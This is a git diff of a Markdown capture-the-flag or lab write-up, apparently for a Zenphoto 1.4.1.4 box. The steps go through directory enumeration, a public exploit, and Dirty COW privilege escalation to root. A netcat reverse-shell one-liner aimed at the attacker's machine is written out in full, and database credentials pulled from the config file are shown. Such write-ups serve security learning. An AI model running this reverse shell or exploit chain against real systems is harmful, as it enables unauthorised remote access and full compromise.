@@ -16,8 +16,7 @@ IP: 192.168.241.41
 - Text
 
 ## Improved skills
-- skill 1
-- skill 2
+- finding application and version in source code
 
 ## Used tools
 - nmap
@@ -189,11 +188,11 @@ by Ben "epi" Risher 🤓                 ver: 2.4.1
 
 #### -Per the previous feroxbuster results I navigated to "http://[target IP]/test" and found the following web page which shows it is being run by Zenphoto:
 
-![](Pasted%20image%2020221111200923.png)
+![](Images/Pasted%20image%2020221111200923.png)
 
 #### -Read the source page of "feroxbuster -u [http://[target IP]/test" and found Zenphoto version 1.4.1.4:
 
-![](Pasted%20image%2020221111200956.png)
+![](Images/Pasted%20image%2020221111200956.png)
 
 #### -Googled "Zenphoto version 1.4.1.4 exploit" and found the following:
 #ZenPhoto
@@ -292,13 +291,13 @@ while(1)
 
 #### -Typed "php shell.php 192.168.53.41 /test/" on kali machine and received the below restricted shell:
 
-![](Pasted%20image%2020221111201606.png)
+![](Images/Pasted%20image%2020221111201606.png)
 
 #### -Started penelope listener on kali machine running on port 80
 
 #### -Typed "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 	[kali tun0 IP]:80 >/tmp/f" and received a stable shell:
 
-![](Pasted%20image%2020221111201646.png)
+![](Images/Pasted%20image%2020221111201646.png)
 
 ---
 
@@ -312,18 +311,28 @@ $conf['mysql_pass'] = 'hola';           // Supply your Database password.
 $conf['mysql_host'] = 'localhost';  // Supply the name of your Database server.
 $conf['mysql_database'] = 'zenphoto';       // Supply the name of Zenphoto's database 
 
-![](Pasted%20image%2020221111202027.png)
+![](Images/Pasted%20image%2020221111202027.png)
 
-![](Pasted%20image%2020221111202056.png)
+![](Images/Pasted%20image%2020221111202056.png)
 
 #### -Uploaded and ran"linpeas.sh" on target machine 
 
 #### -Was unable to find any privilege escalation vectors from output so I googled "Linux 2.6.32 exploit" as from the linpeas output it showed target machine running OS Linux 2.6.32. Found the following link/web page:
 
+![](Images/Pasted%20image%2020221111202136.png)
+
+![](Images/Pasted%20image%2020221111202158.png)
+
+![](Images/Pasted%20image%2020221111202226.png)
+
 
 
 ## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+## CVE-2016-5195 - Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' Privilege Escalation
+
+#### -Followed the steps for the exploit and received root privileges for target machine:
+
+![](Images/Pasted%20image%2020221111202310.png)
 
 ---
 
